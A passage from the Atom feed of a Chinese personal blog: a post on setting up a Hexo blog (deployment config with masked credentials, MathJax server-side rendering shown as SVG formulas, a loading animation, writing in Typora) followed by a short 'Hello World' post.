class="line">      <span class="bullet">-</span> <span class="string">img/logo.svg</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">img/razor-*-black.svg</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">cos-cdn</span><span class="comment"># 上传CDN</span></span><br><span class="line">    <span class="attr">cloud:</span> <span class="string">aliyun</span></span><br><span class="line">    <span class="attr">cdnUrl:</span> <span class="string">https://****.aliyuncs.com</span></span><br><span class="line">    <span class="attr">bucket:</span> <span class="string">****</span></span><br><span class="line">    <span class="attr">region:</span> <span class="string">****</span></span><br><span class="line">    <span class="attr">cdnEnable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">secretId:</span> <span class="string">****</span></span><br><span class="line">    <span class="attr">secretKey:</span> <span class="string">****</span></span><br><span class="line">    <span class="attr">disallowFiles:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">*.html</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">atom.xml</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">content.json</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">manifest.json</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">sitemap.xml</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CNAME</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">robots.txt</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">delete-sth</span><span class="comment"># 删除已经上传的图片资源</span></span><br><span class="line">    <span class="attr">deleteFiles:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">20</span><span class="string">*.png</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">20</span><span class="string">*.jpg</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">20</span><span class="string">*.jpg</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">20</span><span class="string">*.gif</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">20</span><span class="string">*.ico</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">20</span><span class="string">*.svg</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">about/*.png</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">css/*</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">js/*</span></span><br><span class="line">    <span class="attr">deleteEmptyFolder:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span><span class="comment"># GitHub Page 部署</span></span><br><span class="line">    <span class="attr">repo:</span> </span><br><span class="line">      <span class="attr">url:</span> <span class="string">https://github.com/****</span></span><br><span class="line">      <span class="attr">branch:</span> <span class="string">page</span></span><br><span class="line">      <span class="attr">token:</span> <span class="string">$GITHUB_TOKEN</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">page</span></span><br><span class="line">    <span class="attr">token:</span> <span class="string">$GITHUB_TOKEN</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">****</span></span><br><span class="line">    <span class="attr">email:</span> <span class="string">****@***.***</span></span><br></pre></td></tr></table></figure><h2 id="公式SSR"><a href="#公式SSR" class="headerlink" title="公式SSR"></a>公式SSR</h2><p>可能很少写公式，但是这功能我觉得很重要。<a href="https://github.com/ikeq/hexo-filter-mathjax-ssr">hexo-filter-mathjax-ssr</a>。它可以在渲染时把公式转为<code>svg</code>格式，这样就不需要前端加载<code>mathjax</code>组件；也不会让读者看到转瞬即逝的丑陋代码，并且也能在<code>Typora</code>中带来统一的体验。<br>给个渲染例子：</p><p>行内 <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="20.401ex" height="6.343ex" style="vertical-align: -2.005ex;" viewBox="0 -1867.7 8783.9 2730.8" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title"><title id="MathJax-SVG-1-Title">x = {-b \pm \sqrt{b^2-4ac} \over 2a}</title><defs aria-hidden="true"><path stroke-width="1" id="E1-GYREPAGELLANORMAL-1D465" d="M484 472l-15 -85l-14 -4c-5 15 -17 23 -33 23c-31 0 -58 -23 -105 -88l-35 -49l18 -101c5 -29 16 -66 25 -85c10 -20 23 -30 38 -30c16 0 41 15 77 45l9 -19l-49 -44c-32 -29 -64 -46 -86 -46c-36 0 -58 39 -72 124l-11 69l-76 -117c-31 -47 -70 -76 -103 -76 c-12 0 -28 4 -43 12c1 7 2 10 4 22c6 32 8 45 8 65l20 3l11 -28c2 -5 13 -9 28 -9c28 0 62 32 105 99l40 62l-11 62c-17 98 -39 139 -72 139c-19 0 -39 -14 -69 -48l-17 10l58 83c9 13 31 21 57 21c59 0 86 -36 98 -135l6 -48l37 55c62 92 102 128 142 128c9 0 18 -3 30 -10 Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-3D" d="M680 330h-600c2 10 3 20 3 30s-1 20 -3 30h600c-2 -10 -3 -20 -3 -30s1 -20 3 -30zM680 110h-600c2 10 3 20 3 30s-1 20 -3 30h600c-2 -10 -3 -20 -3 -30s1 -20 3 -30Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-2212" d="M680 220h-600c2 10 3 20 3 30s-1 20 -3 30h600c-2 -10 -3 -20 -3 -30s1 -20 3 -30Z"></path><path stroke-width="1" id="E1-GYREPAGELLANORMAL-1D44F" d="M433 376c0 -132 -66 -269 -162 -337c-43 -31 -94 -50 -131 -50c-55 0 -103 33 -103 72c0 3 0 7 1 10l101 551c1 6 2 17 2 24c0 17 -10 24 -34 24h-48l4 21c72 7 108 16 160 42l12 -11l-86 -398c62 79 95 109 146 136c28 14 58 22 82 22c15 0 28 -5 35 -14 c12 -15 21 -54 21 -92zM361 352c0 49 -13 72 -39 72c-29 0 -81 -29 -114 -63c-40 -42 -64 -90 -83 -170c-9 -37 -13 -65 -13 -90c0 -42 25 -65 71 -65c54 0 94 32 127 101c30 65 51 151 51 215Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-B1" d="M680 -170h-600c2 10 3 20 3 30s-1 20 -3 30h600c-2 -10 -3 -20 -3 -30s1 -20 3 -30zM680 220h-270v-270c-10 2 -20 3 -30 3s-20 -1 -30 -3v270h-270c2 10 3 20 3 30s-1 20 -3 30h270v270c10 -2 20 -3 30 -3s20 1 30 3v-270h270c-2 -10 -3 -20 -3 -30s1 -20 3 -30Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-32" d="M468 -3l-229 3l-223 -3v26l170 181c113 120 155 194 155 269c0 85 -55 139 -141 139c-67 0 -103 -25 -119 -83l-13 -46h-29l17 136c49 50 98 70 170 70c127 0 205 -71 205 -186c0 -75 -30 -130 -127 -233l-182 -193l346 10c-2 -22 -2 -32 -2 -45c0 -14 0 -24 2 -45Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-34" d="M472 -3l-153 3l-161 -3v30l62 3c49 2 60 16 60 76v75h-267l-11 23l283 463l74 27l12 -5c-5 -41 -7 -127 -7 -305v-139h27c32 0 81 3 81 3v-71c-28 3 -49 4 -108 4v-75c0 -60 11 -73 60 -76l48 -3v-30zM280 245v352l-215 -352h215Z"></path><path stroke-width="1" id="E1-GYREPAGELLANORMAL-1D44E" d="M406 85c-82 -68 -123 -96 -146 -96c-15 0 -24 14 -24 37c0 16 2 33 6 51l29 127c-55 -78 -95 -125 -138 -162c-37 -32 -74 -53 -95 -53c-19 0 -34 34 -34 77c0 80 31 199 75 288c25 49 57 79 120 110c27 13 47 18 75 18c27 0 46 -4 85 -19l33 18l10 -9l-92 -379 c-1 -3 -1 -6 -1 -10c0 -16 5 -24 15 -24c15 0 30 9 62 36c5 4 6 5 13 11zM319 414c-43 15 -62 19 -85 19c-49 0 -73 -18 -97 -76c-35 -83 -61 -194 -61 -258c0 -27 6 -40 18 -40c33 0 96 61 151 145c33 51 52 103 74 210Z"></path><path stroke-width="1" id="E1-GYREPAGELLANORMAL-1D450" d="M389 458c-9 -26 -16 -63 -24 -128h-23v60c0 24 -36 43 -81 43c-32 0 -57 -8 -78 -26c-48 -39 -82 -142 -82 -248c0 -79 29 -119 85 -119c35 0 73 17 145 65l15 10l8 -20l-50 -41c-55 -45 -103 -65 -157 -65c-80 0 -122 51 -122 147c0 107 38 211 95 261s128 85 173 85 c38 0 71 -8 96 -24Z"></path><path stroke-width="1" id="E1-GYREPAGELLASIZE1-221A" d="M733 780h-63l-253 -1090c-14 2 -27 3 -41 3s-27 -1 -41 -3l-146 426h-69v60h151l117 -344l234 1008h111v-60Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D465" x="0" y="0"></use> <use xlink:href="#E1-GYREPAGELLAMAIN-3D" x="778" y="0"></use><g transform="translate(1816,0)"><g transform="translate(120,0)"><rect stroke="none" width="6727" height="60" x="0" y="220"></rect><g transform="translate(60,726)"> <use xlink:href="#E1-GYREPAGELLAMAIN-2212" x="0" y="0"></use> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44F" x="760" y="0"></use> <use xlink:href="#E1-GYREPAGELLAMAIN-B1" x="1446" y="0"></use><g transform="translate(2428,0)"> <use xlink:href="#E1-GYREPAGELLASIZE1-221A" x="0" y="104"></use><rect stroke="none" width="3474" height="60" x="703" y="885"></rect><g transform="translate(703,0)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44F" x="0" y="0"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-32" x="655" y="408"></use> <use xlink:href="#E1-GYREPAGELLAMAIN-2212" x="1139" y="0"></use> <use xlink:href="#E1-GYREPAGELLAMAIN-34" x="2122" y="0"></use> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="2622" y="0"></use> <use xlink:href="#E1-GYREPAGELLANORMAL-1D450" x="3067" y="0"></use></g></g></g><g transform="translate(2891,-710)"> <use xlink:href="#E1-GYREPAGELLAMAIN-32" x="0" y="0"></use> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="500" y="0"></use></g></g></g></g></svg> 的渲染！</p><p style="text-align:center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="27.105ex" height="12.509ex" style="vertical-align: -5.671ex; margin-left: -0.043ex;" viewBox="-18.5 -2944.1 11670.4 5385.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title"><title id="MathJax-SVG-1-Title">A= \begin{bmatrix}{a_{11}}&amp;{a_{12}}&amp;{\cdots}&amp;{a_{1n}}\\{a_{21}}&amp;{a_{22}}&amp;{\cdots}&amp;{a_{2n}}\\{\vdots}&amp;{\vdots}&amp;{\ddots}&amp;{\vdots}\\{a_{m1}}&amp;{a_{m2}}&amp;{\cdots}&amp;{a_{mn}}\\\end{bmatrix}</title><defs aria-hidden="true"><path stroke-width="1" id="E1-GYREPAGELLANORMAL-1D434" d="M677 -3l-122 3l-122 -3v28l44 3c28 2 43 11 43 27c0 5 -1 13 -2 22l-27 200h-246l-102 -175c-20 -34 -26 -47 -26 -55c0 -9 14 -18 31 -19l52 -3v-28c-35 2 -71 3 -107 3l-112 -3v30l20 5c34 8 53 24 88 80l373 593h46l87 -625c6 -45 9 -47 56 -52l26 -3v-28zM486 313 l-37 288l-179 -288h216Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-3D" d="M680 330h-600c2 10 3 20 3 30s-1 20 -3 30h600c-2 -10 -3 -20 -3 -30s1 -20 3 -30zM680 110h-600c2 10 3 20 3 30s-1 20 -3 30h600c-2 -10 -3 -20 -3 -30s1 -20 3 -30Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-5B" d="M330 -130c-2 -6 -3 -13 -3 -20s1 -14 3 -20h-210v840h210c-2 -6 -3 -13 -3 -20s1 -14 3 -20h-150v-760h150Z"></path><path stroke-width="1" id="E1-GYREPAGELLANORMAL-1D44E" d="M406 85c-82 -68 -123 -96 -146 -96c-15 0 -24 14 -24 37c0 16 2 33 6 51l29 127c-55 -78 -95 -125 -138 -162c-37 -32 -74 -53 -95 -53c-19 0 -34 34 -34 77c0 80 31 199 75 288c25 49 57 79 120 110c27 13 47 18 75 18c27 0 46 -4 85 -19l33 18l10 -9l-92 -379 c-1 -3 -1 -6 -1 -10c0 -16 5 -24 15 -24c15 0 30 9 62 36c5 4 6 5 13 11zM319 414c-43 15 -62 19 -85 19c-49 0 -73 -18 -97 -76c-35 -83 -61 -194 -61 -258c0 -27 6 -40 18 -40c33 0 96 61 151 145c33 51 52 103 74 210Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-31" d="M418 -3l-157 3l-165 -3v30l56 3c54 3 65 14 65 66v485c0 24 -2 33 -8 33l-3 -1l-129 -58h-10l-7 43c91 32 162 62 227 96l14 -5v-593c0 -52 10 -63 65 -66l52 -3v-30Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-32" d="M468 -3l-229 3l-223 -3v26l170 181c113 120 155 194 155 269c0 85 -55 139 -141 139c-67 0 -103 -25 -119 -83l-13 -46h-29l17 136c49 50 98 70 170 70c127 0 205 -71 205 -186c0 -75 -30 -130 -127 -233l-182 -193l346 10c-2 -22 -2 -32 -2 -45c0 -14 0 -24 2 -45Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-22EF" d="M200 250c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60zM490 250c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60zM780 250c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60Z"></path><path stroke-width="1" id="E1-GYREPAGELLANORMAL-1D45B" d="M514 85c-98 -73 -134 -94 -160 -94c-19 0 -30 15 -30 40c0 16 4 39 13 76l52 212c8 32 11 53 11 71c0 15 -6 24 -17 24c-45 0 -119 -62 -174 -146c-45 -69 -67 -134 -86 -260c-22 -4 -45 -10 -70 -17l-7 11c41 143 82 336 82 387c0 15 -7 25 -18 25c-7 0 -11 -1 -47 -25 l-32 -21l-7 20l28 20c73 52 112 74 133 74c15 0 23 -12 23 -33c0 -11 -2 -23 -6 -41l-38 -161c52 73 80 107 118 142c59 55 128 93 170 93c20 0 31 -13 31 -36c0 -17 -4 -45 -11 -74l-66 -276c-1 -4 -2 -15 -2 -20c0 -11 6 -20 13 -20c10 0 32 11 61 30l26 17Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-22EE" d="M200 -70c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60zM200 250c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60zM200 570c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-22F1" d="M426 250c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60zM200 476c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60zM653 24c0 -36 -24 -60 -60 -60s-60 24 -60 60s24 60 60 60s60 -24 60 -60Z"></path><path stroke-width="1" id="E1-GYREPAGELLANORMAL-1D45A" d="M740 85c-98 -73 -134 -94 -160 -94c-19 0 -30 15 -30 40c0 22 5 48 13 76l43 157c24 87 25 101 25 125c0 16 -5 25 -13 25c-32 0 -82 -35 -137 -96c-44 -49 -78 -124 -94 -205l-21 -107l-69 -15l-5 11l16 67c42 175 63 289 63 324c0 13 -4 21 -11 21 c-28 0 -73 -30 -115 -76c-55 -60 -82 -119 -106 -230l-22 -102l-68 -15l-3 11c41 143 82 336 82 387c0 15 -7 25 -18 25c-7 0 -11 -1 -47 -25l-32 -21l-7 20l28 20c74 53 112 74 133 74c14 0 23 -12 23 -31c0 -12 -2 -27 -6 -43l-33 -133c65 88 85 109 129 143 c55 42 101 64 131 64c16 0 26 -12 26 -31c0 -7 -3 -22 -7 -42l-30 -137c49 69 84 104 147 149c61 43 99 61 128 61c16 0 26 -11 26 -28c0 -8 -3 -24 -7 -41l-75 -297c-5 -21 -7 -30 -7 -40c0 -11 6 -20 13 -20c10 0 32 11 61 30l26 17Z"></path><path stroke-width="1" id="E1-GYREPAGELLAMAIN-5D" d="M290 -170h-210c2 6 3 13 3 20s-1 14 -3 20h150v760h-150c2 6 3 13 3 20s-1 14 -3 20h210v-840Z"></path><path stroke-width="1" id="E1-GYREPAGELLASYMBOLS-23A1" d="M425 1214c-2 -6 -3 -13 -3 -20s1 -14 3 -20h-202v-1174h-80v1214h282Z"></path><path stroke-width="1" id="E1-GYREPAGELLASYMBOLS-23A3" d="M425 0h-282v1214h80v-1174h202c-2 -6 -3 -13 -3 -20s1 -14 3 -20Z"></path><path stroke-width="1" id="E1-GYREPAGELLASYMBOLS-23A2" d="M223 810v-810h-80v810h80Z"></path><path stroke-width="1" id="E1-GYREPAGELLASYMBOLS-23A4" d="M378 0h-80v1174h-202c2 6 3 13 3 20s-1 14 -3 20h282v-1214Z"></path><path stroke-width="1" id="E1-GYREPAGELLASYMBOLS-23A6" d="M378 0h-282c2 6 3 13 3 20s-1 14 -3 20h202v1174h80v-1214Z"></path><path stroke-width="1" id="E1-GYREPAGELLASYMBOLS-23A5" d="M378 0h-80v810h80v-810Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D434" x="0" y="0"></use> <use xlink:href="#E1-GYREPAGELLAMAIN-3D" x="1000" y="0"></use><g transform="translate(2038,0)"><g transform="translate(0,2850)"> <use xlink:href="#E1-GYREPAGELLASYMBOLS-23A1" x="0" y="-1215"></use><g transform="translate(0,-4030.467980295566) scale(1,3.5320197044334973)"> <use xlink:href="#E1-GYREPAGELLASYMBOLS-23A2"></use></g> <use xlink:href="#E1-GYREPAGELLASYMBOLS-23A3" x="0" y="-5199"></use></g><g transform="translate(688,0)"><g transform="translate(-11,0)"><g transform="translate(98,2050)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-31"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-31" x="500" y="0"></use></g></g><g transform="translate(98,650)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-32"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-31" x="500" y="0"></use></g></g> <use xlink:href="#E1-GYREPAGELLAMAIN-22EE" x="584" y="-750"></use><g transform="translate(0,-2150)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLANORMAL-1D45A" x="0" y="0"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-31" x="778" y="0"></use></g></g></g><g transform="translate(2438,0)"><g transform="translate(98,2050)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-31"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-32" x="500" y="0"></use></g></g><g transform="translate(98,650)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-32"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-32" x="500" y="0"></use></g></g> <use xlink:href="#E1-GYREPAGELLAMAIN-22EE" x="584" y="-750"></use><g transform="translate(0,-2150)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLANORMAL-1D45A" x="0" y="0"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-32" x="778" y="0"></use></g></g></g><g transform="translate(4887,0)"> <use xlink:href="#E1-GYREPAGELLAMAIN-22EF" x="0" y="2050"></use> <use xlink:href="#E1-GYREPAGELLAMAIN-22EF" x="0" y="650"></use> <use xlink:href="#E1-GYREPAGELLAMAIN-22F1" x="63" y="-750"></use> <use xlink:href="#E1-GYREPAGELLAMAIN-22EF" x="0" y="-2150"></use></g><g transform="translate(6747,0)"><g transform="translate(98,2050)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-31" x="0" y="0"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLANORMAL-1D45B" x="500" y="0"></use></g></g><g transform="translate(98,650)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLAMAIN-32" x="0" y="0"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLANORMAL-1D45B" x="500" y="0"></use></g></g> <use xlink:href="#E1-GYREPAGELLAMAIN-22EE" x="603" y="-750"></use><g transform="translate(0,-2150)"> <use xlink:href="#E1-GYREPAGELLANORMAL-1D44E" x="0" y="0"></use><g transform="translate(444,-150)"> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLANORMAL-1D45A" x="0" y="0"></use> <use transform="scale(0.707)" xlink:href="#E1-GYREPAGELLANORMAL-1D45B" x="778" y="0"></use></g></g></g></g><g transform="translate(9091,2850)"> <use xlink:href="#E1-GYREPAGELLASYMBOLS-23A4" x="0" y="-1215"></use><g transform="translate(0,-4030.467980295566) scale(1,3.5320197044334973)"> <use xlink:href="#E1-GYREPAGELLASYMBOLS-23A5"></use></g> <use xlink:href="#E1-GYREPAGELLASYMBOLS-23A6" x="0" y="-5199"></use></g></g></g></svg><br>独立居中！</p><h2 id="Loading"><a href="#Loading" class="headerlink" title="Loading"></a>Loading</h2><p>如果你网速比较慢，你可以看到一直可爱的小水母（<del>其实是乌贼</del>），他的原图如下，但是蓝色加载动画在纯白背景中显得非常的突兀（这不得魔改一把？）</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/my-blog/1441607667921515.gif" alt="原始的Loading"></p><p>通过简单的PS技巧修改而成（手有PS走遍天下都不怕）。</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/my-blog/image-20211030181312744.png" alt="图层"></p><p>也将他的大小压到了 28KB</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/my-blog/image-20211030181835274.png"></p><h2 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h2><p>最后来说说协作体验，能坚持博客，一定要写的舒服！</p><p>虽然<code>Markdown</code>只要用个记事本就可以完成撰写，但是图片等附件还是需要你慢慢的拖和改。<br>经过摸索，我使用<a href="https://www.typora.io/">Typora</a></p><p>可以在普通模式中像飞书文档一样编写，也可以通过<code>CTRL + /</code> 进入源码模式进行精细的编辑（能双栏同时滚动就更好了）。</p><p>并没有做过多的配置，就配置了一项</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/my-blog/image-20211030173939410.png" alt="图像设置"></p><p>这样就可以使用剪贴板来粘贴图片，再配合上<code>Hexo</code>的<code>post_asset_folder: true</code> 既能在<code>Typora</code>中正常浏览，渲染也不会出现问题。</p><h1 id="终"><a href="#终" class="headerlink" title="终"></a>终</h1><p>第一篇比较正式的博文，拖了好久终于写完了，感谢阅读~</p><p><strong>Keep learning，keep sharing！</strong></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;启&quot;&gt;&lt;a href=&quot;#启&quot; class=&quot;headerlink&quot; title=&quot;启&quot;&gt;&lt;/a&gt;启&lt;/h1&gt;&lt;p&gt;果然，第一篇肯定要讲一讲自己是如何配置的我的博客。&lt;/p&gt;
&lt;p&gt;从 &lt;code&gt;WordPress&lt;/code&gt; 研究到&lt;code&gt; ZBlog&lt;/code&gt;，最后还是选了老朋友 &lt;code&gt;Hexo&lt;/code&gt; （毕竟可以&lt;code&gt;GitHub Page&lt;/code&gt;）&lt;/p&gt;</summary>
    
    
    
    <category term="破事水" scheme="https://blog.kur4ge.com/categories/%E7%A0%B4%E4%BA%8B%E6%B0%B4/"/>
    
    
    <category term="Hexo" scheme="https://blog.kur4ge.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://blog.kur4ge.com/2021/10/hello-world/"/>
    <id>https://blog.kur4ge.com/2021/10/hello-world/</id>
    <published>2021-10-20T00:00:00.000Z</published>
    <updated>2021-10-19T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>不知不觉打工也一年多了，</p><p>日常的重复工作让人变得咸鱼。</p><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/hello-world/salted-fish.gif?x-oss-process=style/w200"></p></div><p>但是！</p><p>搞安全怎么能停止对新姿势的学习呢？</p><p>Keep learning，keep sharing！</p><div align=center><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/hello-world/%E5%98%89%E6%B2%B9.gif" alt="嘉油"></p></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不知不觉打工也一年多了，&lt;/p&gt;
&lt;p&gt;日常的重复工作让人变得咸鱼。&lt;/p&gt;
&lt;div align=center&gt;

&lt;p&gt;&lt;img src=&quot;https://kur4ge.oss-accelerate.aliyuncs.com/2021/10/hello-world/sa</summary>
      
    
    
    
    <category term="破事水" scheme="https://blog.kur4ge.com/categories/%E7%A0%B4%E4%BA%8B%E6%B0%B4/"/>
    
    
  </entry>
  
</feed>
